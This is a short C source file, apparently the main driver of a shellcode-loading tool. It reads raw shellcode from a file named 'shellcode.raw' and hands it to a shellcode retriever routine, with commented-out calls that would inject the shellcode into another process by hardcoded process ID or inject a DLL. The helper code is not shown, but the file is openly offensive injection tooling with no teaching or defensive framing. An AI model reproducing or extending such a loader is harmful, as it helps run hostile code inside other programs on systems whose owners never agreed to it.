#define _CRT_SECURE_NO_WARNINGS

#include "get_raw_shellcode_from_file.h"
#include "process-injector.h"
#include"dll-injector.h"
#include "shellcode-retriever.h"

int main(int argc, char *argv[]) {
	const char *filename = "shellcode.raw";
	//const char *dll = "C:\\FULL\\PATH\\TO\\DLL\\shellcode.dll";
	shellcode_retreiver(get_raw_shellcode_from_file(filename));
	//process_injector(11216, get_raw_shellcode_from_file(filename));
	//dll_injector(10872, dll);
	return 0;
}
